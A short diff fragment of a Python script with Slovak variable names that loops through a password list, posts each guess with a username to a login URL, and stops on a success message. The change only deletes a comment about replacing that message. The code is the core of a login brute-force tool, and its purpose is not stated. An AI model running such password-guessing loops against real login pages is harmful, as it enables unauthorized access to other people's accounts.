@@ -17,7 +17,7 @@ for heslo in hesla:
     data = {'username': username, 'password': heslo}
     odpoved = requests.post(url, data=data)
 
-    if "Úspešne si sa prihlásil" in odpoved.text:  # replace with the actual success message
+    if "Úspešne si sa prihlásil" in odpoved.text:
         najdene_heslo = heslo
         break
 
